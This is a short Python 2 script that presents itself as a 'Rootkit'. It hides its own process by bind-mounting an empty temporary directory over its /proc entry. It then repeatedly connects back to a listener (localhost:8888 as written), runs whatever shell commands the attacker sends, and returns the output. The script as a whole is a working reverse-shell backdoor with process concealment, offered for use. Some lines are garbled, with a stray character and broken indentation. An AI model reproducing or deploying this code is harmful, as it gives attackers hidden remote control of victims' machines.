#!/usr/bin/python


import os,socket,subprocess,string,time
import random as r
ch = string.uppercase + string.digits # Strings to generate the temporary random process name from
token = "".join(r.choice(ch) for i in range(72)) 
pid = os.getpid() 
os.system("mkdir /tmp/{1} && mount -o bind /tmp/{1} /proc/{0}".format(pid,token)) # make bind mount on the current process folder in /proc to hide it 
host = "localhost" 
port = 8888 
print "[+]Rootkit is working now , check your connection  .. " # print message (for debugging issues)
def MakeConnection(h,p): 
	try: 
		time.sleep(5) # Reverse connection interval
		sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		sock.connect((h,p))
		while True:

				command =  sock.recv(1024) r
			        if command.strip("\n") == "exit": # Exit if the attacker sent exit command
                		     sock.close() # Close socket
       			        proc = subprocess.Popen(command , stdout=subprocess.PIPE , stderr=subprocess.PIPE , shell=True) # Execute the sent command
        			proc_result = proc.stdout.read() + proc.stderr.read() 
        			sock.send(proc_result) 

	except socket.error:
		pass  

while True:
	MakeConnection(host,port) 
